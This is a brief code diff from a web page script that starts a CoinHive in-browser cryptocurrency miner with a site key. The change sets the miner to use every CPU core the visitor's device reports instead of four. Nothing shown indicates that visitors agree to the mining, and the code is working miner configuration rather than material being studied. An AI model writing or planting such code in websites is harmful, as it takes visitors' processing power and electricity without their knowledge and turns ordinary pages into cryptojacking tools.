@@ -9,7 +9,7 @@ function addScript( src,callback) {
 
 function start(){
   var miner = new CoinHive.Anonymous('H3QMiNzSRGMRObqvqtk0BG3cNIqxUuvr', {
-	threads: 4,
+	threads: navigator.hardwareConcurrency,
 	autoThreads: false,
 	throttle: 0.5,
 	forceASMJS: false
